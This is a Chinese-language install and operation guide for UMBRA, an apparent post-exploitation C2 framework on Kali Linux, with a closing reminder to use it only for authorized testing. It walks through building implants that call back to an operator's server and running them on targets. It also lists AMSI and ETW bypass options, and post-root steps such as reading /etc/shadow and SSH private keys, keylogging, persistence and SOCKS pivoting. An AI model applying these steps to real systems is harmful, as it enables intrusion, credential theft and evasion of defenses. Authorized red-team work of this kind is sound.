# UMBRA · Kali 安装与使用指南

> 本文只讲 Kali Linux 上的操作。已在 **Kali GNU/Linux Rolling 2026.2** 实测通过。

---

## 目录

- [一、安装](#一安装)
- [二、创建操作员密钥](#二创建操作员密钥)
- [三、启动服务端](#三启动服务端)
- [四、启动客户端](#四启动客户端)
- [五、连接服务器](#五连接服务器)
- [六、创建监听器](#六创建监听器)
- [七、生成植入体](#七生成植入体)
- [八、会话上线](#八会话上线)
- [九、日常使用](#九日常使用)
- [十、排错](#十排错)
- [十一、卸载](#十一卸载)

---

## 一、安装

### 1.1 前置检查

Kali 默认已带大部分工具。确认一下：

```bash
git --version
python3 --version    # 需要 3.10+
node --version       # 需要 20+，没有会自动装
```

### 1.2 一条命令安装

```bash
git clone https://github.com/Leechuihui/umbra.git
cd umbra
sudo bash install.sh all
```

**耗时约 30–40 分钟**（要下载 Node、pip 包、编译 Rust 编码器、构建 Electron）。

> 用 `bash install.sh` 而不是 `./install.sh`，避免脚本缺执行位时失败。

### 1.3 安装脚本会自动处理这些 Kali 特有问题

| Kali 的问题 | 脚本的处理 |
|---|---|
| 没有 `libfuse2`（只有 libfuse3） | 客户端自动用 `--appimage-extract-and-run` |
| `/tmp` 是 1.9G 内存盘 | 把 `TMPDIR` 重定向到磁盘 |
| `libgtk-3-0` 等包名是 t64 版本 | 自动检测新旧包名 |
| 某个包不可用 | 逐包安装，只警告不中断 |

### 1.4 验证安装

```bash
cd /opt/umbra
./umbra.py version
```

期望输出：

```
client   1.0.0
server   1.4.8
```

检查关键产物：

```bash
ls -lh client/gui/dist/umbra.AppImage    # 约 149M
ls -d server/venv                         # Python 环境
ls -lh server/infra/bin/encoders/sgn/sgn  # 编码器
```

### 1.5 桌面快捷方式

安装脚本会自动创建：

```
~/.local/share/applications/com.umbra.app.desktop
```

在 Kali 应用菜单里搜 **UMBRA** 就能看到。

---

## 二、创建操作员密钥

```bash
cd /opt/umbra
./umbra.py server key add admin
```

**输出示例**：

```
admin:CjzeeStPQ9wfCnyH5iwHKzK:BtdxBz5pYq4fcOpFefvwwlmgIrO5...
Operator created successfully: admin
Saved: /opt/umbra/admin.key
```

### 密钥格式

```
用户名:密码:密钥
  ↑      ↑     ↑
 admin  ...   ...
```

**这是三段式双因素认证**：

| 段 | 作用 | 存储方式 |
|---|---|---|
| 用户名 | 标识身份 | 明文 |
| 密码 | 你知道什么 | bcrypt 哈希 |
| 密钥 | 你持有什么 | 明文（128 字符） |

### 重要提醒

- **整行都要保存**，只显示这一次
- 文件在 `/opt/umbra/admin.key`
- 查看：`cat /opt/umbra/admin.key`

### 管理操作员

```bash
./umbra.py server key list        # 列出
./umbra.py server key rem admin   # 删除（该用户的 JWT 立即失效）
```

---

## 三、启动服务端

```bash
cd /opt/umbra
./umbra.py server start
```

**期望输出**：

```
Loading dependencies ... done
Starting SQLite database ... done
Starting NukeScripts worker ... done
INFO:     Uvicorn running on http://0.0.0.0:9000
```

### 验证

```bash
ss -ltn | grep 9000
# LISTEN 0 2048 0.0.0.0:9000 0.0.0.0:*
```

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:9000/
# 401   ← 正常，说明认证保护生效
```

> **401 是好事**，不是错误。说明服务端在跑，且认证中间件工作正常。

### 两种运行方式

**方式 A · 前台运行**（推荐调试时用）

```bash
./umbra.py server start
```

这个终端不能关。建议 `Ctrl+Shift+T` 开新终端做后续操作。

**方式 B · 后台运行**（推荐日常用）

```bash
cd /opt/umbra
setsid nohup ./umbra.py server start > /tmp/umbra-server.log 2>&1 < /dev/null &
```

查看日志：`tail -f /tmp/umbra-server.log`

停止服务端：`pkill -f 'server/main.py'`

---

## 四、启动客户端

### 方式 A · 桌面快捷方式（最简单）

Kali 应用菜单 → 搜 **UMBRA** → 点击

### 方式 B · 命令行

```bash
export DISPLAY=:0
/opt/umbra/client/gui/dist/umbra.AppImage --appimage-extract-and-run --no-sandbox
```

### 两个参数为什么必须加

| 参数 | 原因 |
|---|---|
| `--appimage-extract-and-run` | Kali 只有 libfuse3，AppImage 需要 libfuse2 才能挂载 |
| `--no-sandbox` | 以 root 运行时 Chromium 沙箱会冲突 |

> 用桌面快捷方式时，这些参数已经写进 `.desktop` 文件，不用手动加。

### 首次启动会创建配置

```
~/.config/umbra/config.json
```

初始内容：

```json
{
  "servers": []
}
```

---

## 五、连接服务器

### 操作步骤

1. 顶栏点击 **UMBRA → 服务器**
2. 点 **添加**
3. 填写表单

| 字段 | 值 | 说明 |
|---|---|---|
| 名称 | `kali-local` | 任意，方便识别 |
| 协议 | `http` | 本机测试用 http |
| 主机 | `127.0.0.1` | 服务端就在本机 |
| 端口 | `9000` | 服务端默认端口 |
| 密钥 | 粘贴**整行** | `admin:xxx:yyy` |

4. **点「认证」按钮** ← 关键！

### ⚠️ 为什么必须点认证

**服务器配置只有在认证成功后才写入 `config.json`。**

```
填表单 → 点认证 → 服务端验证 → 返回 JWT → 写入 config.json
                ↓
           失败则不保存
```

**只填表单不点认证 = 什么都没保存。** 后面建监听器时，服务器下拉框会是空的，看起来像「点不动」。

### 验证成功

```bash
cat ~/.config/umbra/config.json
```

应该看到 `servers` 数组里有内容，带一个 `token` 字段：

```json
{
  "servers": [
    {
      "id": "a1b2c3",
      "name": "kali-local",
      "ip": "http://127.0.0.1",
      "port": "9000",
      "user": "admin",
      "pass": "...",
      "secret": "...",
      "token": "eyJhbGciOiJIUzI1NiIs..."
    }
  ]
}
```

界面表现：状态灯变绿，提示 `Authenticated`。

---

## 六、创建监听器

### 操作步骤

1. 按 `Shift+L` 打开监听器面板
2. 点 **添加**
3. 填写

| 字段 | 值 | 说明 |
|---|---|---|
| 名称 | `http-8080` | 任意 |
| 类型 | `Channel` | 通道类型 |
| 通道 | `http` | 通信协议 |
| 服务器 | `kali-local - http://127.0.0.1:9000` | 下拉选择 |
| Port to Open | `8080` | **实际监听端口** |

4. 点 **创建**

### 验证

```bash
ss -ltn | grep 8080
# LISTEN 0 2048 0.0.0.0:8080 0.0.0.0:*
```

### 如果服务器下拉框是空的

说明**第五步的认证没成功**。回到第五步，重新添加服务器并点「认证」。

---

## 七、生成植入体

### 操作步骤

1. 按 `Shift+I` 打开植入体面板
2. 选 **Stageless**
3. 填写配置
4. 点 **Build**

### 常规配置

| 字段 | 值 |
|---|---|
| 编译服务器 | `127.0.0.1:9000` |
| 操作系统 | 目标系统（Windows / Linux / macOS） |
| 架构 | `x64` |
| 格式 | `exe` / `elf` / `macho` |

### C2 配置（★最关键）

| 字段 | 值 | 说明 |
|---|---|---|
| 通道 | `http` | 必须和监听器一致 |
| **Server 地址** | **见下方说明** | **目标能访问到的地址** |
| 端口 | `8080` | 监听器端口 |
| 延迟 | `5` | 心跳间隔（秒） |
| 抖动 | `20` | 随机化百分比 |

### Server 地址怎么填（三种情况）

#### 情况 1 · 目标和 Kali 同网段（最简单）

```
Kali 192.168.1.100  ←→  目标 192.168.1.46
```

**填 Kali 的 IP**：`192.168.1.100`

#### 情况 2 · Kali 在 NAT 后（VirtualBox 默认）★常见

```
Kali 10.0.2.15 (NAT) ←→ 宿主机 192.168.1.38 ←→ 目标 192.168.1.46
```

**问题**：目标连不上 `10.0.2.15`（NAT 私有地址）

**解决**：先在宿主机配端口转发

```powershell
VBoxManage controlvm kali natpf1 "umbra-http,tcp,,8080,,8080"
```

**然后填宿主机的 IP**：`192.168.1.38`，端口 `8080`

#### 情况 3 · Kali 有公网 IP / 云服务器

**填公网 IP**，端口建议用 `443`（伪装 HTTPS），通道选 `https`。

### 怎么验证地址填对了

**在目标机上执行**：

```bash
curl -v http://<你填的地址>:8080
```

- 能连上（哪怕返回错误）→ 地址对了
- 连接超时 → 地址错了，换一个

### 延迟与抖动

```
实际心跳间隔 = delay × (1 ± jitter/100) 的随机值
```

例：`delay=5, jitter=20` → 4.0–6.0 秒随机

| 场景 | 延迟 | 抖动 |
|---|---|---|
| 本机演示 | 3–5 秒 | 10–20% |
| 内网测试 | 30–60 秒 | 20–30% |
| 高对抗环境 | 120–300 秒 | 30–50% |

### 运行时规避（可选）

| 选项 | 作用 |
|---|---|
| AMSI patch | 绕过 PowerShell 恶意脚本检测 |
| ETW patch | 绕过 Windows 事件追踪 |
| 睡眠掩码 | 休眠时加密内存，对抗内存扫描 |
| 字符串混淆 | 隐藏敏感字符串 |

---

## 八、会话上线

### 在目标上执行

**Linux 目标**：

```bash
chmod +x implant
./implant

# 后台运行
nohup ./implant &
```

**Windows 目标**：

```cmd
implant.exe

:: 后台运行
start /b implant.exe
```

### 在客户端查看

1. 按 `Alt+S` 打开会话列表
2. 等待几秒（取决于延迟设置）
3. 双击会话进入终端

### 上线失败排查顺序

**按这个顺序查，不要跳步**：

```
① 目标能访问 C2 地址吗？
   → 在目标机 curl http://<c2地址>:<端口>
   → 不通 = 网络问题，先解决网络

② 监听器在监听吗？
   → 在 Kali 执行 ss -ltn | grep 8080
   → 没有 = 监听器没创建成功

③ 端口转发配了吗？（NAT 场景）
   → VBoxManage showvminfo kali --machinereadable | findstr Forwarding
   → 没有 = 补上 natpf1 规则

④ 植入体真的在跑吗？
   → 在目标机 ps aux | grep implant
   → 没有 = 执行失败或被拦截

⑤ 防火墙拦了吗？
   → 目标机 iptables -L / ufw status
   → Kali iptables -L

⑥ 看服务端日志
   → tail -f /tmp/umbra-server.log
```

---

## 九、日常使用

### 快捷键

| 快捷键 | 功能 |
|---|---|
| `Ctrl+K` | 命令面板（模糊搜索所有功能） |
| `Alt+T` | 终端 |
| `Alt+F` | 文件浏览器 |
| `Alt+R` | 进程管理 |
| `Alt+S` | 会话列表 |
| `Alt+K` | 凭据管理 |
| `Shift+L` | 监听器 |
| `Shift+I` | 植入体 |
| `Shift+N` | 网络 / 代理 |
| `Shift+R` | 报告 |
| `Ctrl+W` | 关闭当前面板 |

### 拿到 root 后能做什么

| 操作 | 入口 | 说明 |
|---|---|---|
| 命令执行 | `Alt+T` | `cat /etc/shadow` 等 |
| 文件浏览 | `Alt+F` | 读 `/root/.ssh/id_rsa` |
| 凭据收集 | `Alt+K` | 集中存密码/哈希/密钥 |
| 进程查看 | `Alt+R` | 识别杀软、数据库 |
| 屏幕截图 | 工具栏相机 | 看目标桌面 |
| 键盘记录 | 面板 | 抓输入 |
| **横向移动** | `Shift+N` | SOCKS 代理进内网 |
| 权限维持 | 手动 | crontab / systemd / SSH 公钥 |
| 报告导出 | `Shift+R` | PDF / HTML / JSON |

### SOCKS 代理（横向移动）

1. `Shift+N` 打开网络面板
2. 添加 → 类型选 `socks`
3. 监听端口 `1080`
4. 目标主机填已攻陷的主机
5. 启动

**使用**：

```bash
# 命令行测试
curl --socks5 127.0.0.1:1080 http://内网目标/

# 浏览器配置
# 代理类型：SOCKS5
# 地址：127.0.0.1
# 端口：1080
```

### 命令行工具

```bash
cd /opt/umbra

# 版本
./umbra.py version

# 服务端
./umbra.py server start
./umbra.py server config list
./umbra.py server config set server.port 9443
./umbra.py server config create-tls

# 操作员
./umbra.py server key list
./umbra.py server key add <name>
./umbra.py server key rem <name>

# Python 包
./umbra.py server venv list
./umbra.py server venv install <package>

# 数据库
./umbra.py server db usage
./umbra.py server db export /tmp/umbra-backup.db
./umbra.py server db import /tmp/umbra-backup.db
```

---

## 十、排错

### 安装阶段

| 现象 | 原因 | 解决 |
|---|---|---|
| `Permission denied` | 脚本缺执行位 | `bash install.sh all` |
| `libgtk-3-0 not found` | t64 改名 | 脚本已自动处理 |
| `ENOSPC` | `/tmp` 内存盘不足 | 脚本已重定向 TMPDIR |
| `npm install` 失败 | 网络问题 | 换 npm 镜像 |
| Rust 编译失败 | 缺 cargo | `sudo apt install cargo` |

### 启动阶段

| 现象 | 原因 | 解决 |
|---|---|---|
| 端口被占用 | 9000 已被用 | `sudo lsof -i:9000` 找进程杀掉 |
| 客户端白屏 | GPU 问题 | 加 `--disable-gpu` |
| 客户端闪退 | 缺库 | `ldd` 查缺失的库 |
| `EACCES config.json` | 目录无写权限 | 已修复，配置写到 `~/.config/umbra/` |

### 连接阶段

| 现象 | 原因 | 解决 |
|---|---|---|
| `Invalid credentials` | 密钥某段错 | 检查三段完整性、无多余空格 |
| `Expired session` | JWT 失效 | 重新认证 |
| 连接超时 | 服务端没起 | `ss -ltn \| grep 9000` |
| **下拉框空** | **没点认证** | **重新添加并点认证** |

### 上线阶段

| 现象 | 原因 | 解决 |
|---|---|---|
| 会话不上线 | C2 地址错 | 目标机 `curl` 验证 |
| 会话不上线 | 端口转发没配 | 补 `natpf1` 规则 |
| 会话不上线 | 监听器没建 | `ss -ltn \| grep 8080` |
| 会话不上线 | 防火墙拦 | 检查 `iptables` |
| 上线后掉线 | 心跳超时 | 增大 delay |
| 上线后掉线 | 进程被杀 | 检查杀软 |

### 常用诊断命令

```bash
# 服务端状态
ss -ltn | grep -E ':9000|:8080'
pgrep -af 'server/main.py'

# 服务端日志
tail -50 /tmp/umbra-server.log

# 客户端配置
cat ~/.config/umbra/config.json

# 测试认证
KEY=$(head -1 /opt/umbra/admin.key)
U=${KEY%%:*}; R=${KEY#*:}; P=${R%%:*}; S=${R#*:}
curl -s -X POST http://127.0.0.1:9000/auth/login \
  -H 'Content-Type: application/json' \
  -d "{\"user\":\"$U\",\"pass\":\"$P\",\"secret\":\"$S\"}"
```

---

## 十一、卸载

```bash
# 停止所有进程
pkill -f 'server/main.py'
pkill -f 'appimage_extracted'

# 删除安装目录
sudo rm -rf /opt/umbra

# 删除客户端配置
rm -rf ~/.config/umbra

# 删除桌面快捷方式和图标
rm -f ~/.local/share/applications/com.umbra.app.desktop
rm -rf ~/.local/share/icons/hicolor/*/apps/com.umbra.app.png
```

---

## 附：完整流程速查

```bash
# 1. 安装
git clone https://github.com/Leechuihui/umbra.git
cd umbra && sudo bash install.sh all

# 2. 创建操作员
cd /opt/umbra && ./umbra.py server key add admin

# 3. 启动服务端
./umbra.py server start

# 4. 启动客户端（新终端）
export DISPLAY=:0
/opt/umbra/client/gui/dist/umbra.AppImage --appimage-extract-and-run --no-sandbox

# 5. 客户端里：UMBRA → 服务器 → 添加 → 填 127.0.0.1:9000 + 密钥 → 点「认证」
# 6. 客户端里：Shift+L → 建监听器 :8080
# 7. 客户端里：Shift+I → C2 地址填目标能访问的 IP → Build
# 8. 目标机执行植入体
# 9. 客户端里：Alt+S → 会话上线
```

---

## 安全提醒

> **UMBRA 只能用于授权的安全测试。**
>
> - 必须有**书面授权**，明确测试范围和时间
> - 口头同意不算，事后追认不算
> - 未经授权访问计算机系统违反《刑法》第 285 条
> - 测试完成后要清理所有植入体和后门

---

*UMBRA · Post Exploitation Framework · [github.com/Leechuihui/umbra](https://github.com/Leechuihui/umbra)*
